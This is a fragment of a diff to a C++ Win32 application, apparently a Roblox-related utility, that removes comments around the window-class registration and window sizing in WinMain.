                 L"\u50C5\u5728\u5075\u6E2C\u5230 Roblox \u57F7\u884C\u4E2D\u6642\u624D\u5141\u8A31\u4F7F\u7528\u3002",
 
@@ -1197,7 +1173,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nS
     timeBeginPeriod(1);
     InitInputs();
 
-    // Register cookie window class early (harmless if called again later)
     {
         WNDCLASSW wc     = {};
         wc.lpfnWndProc   = CookieWndProc;
@@ -1208,7 +1183,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nS
         RegisterClassW(&wc);
     }
 
-    // Register main window class
     WNDCLASSW wc     = {};
     wc.lpfnWndProc   = WndProc;
     wc.hInstance     = hInst;
@@ -1218,7 +1192,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nS
     wc.hIcon         = LoadIconW(nullptr, IDI_APPLICATION);
     if (!RegisterClassW(&wc)) return 1;
 
-    // Client area: 460 x 248 — two-panel layout
     RECT rc = { 0, 0, 460, 248 };
     AdjustWindowRect(&rc,
         WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, FALSE);
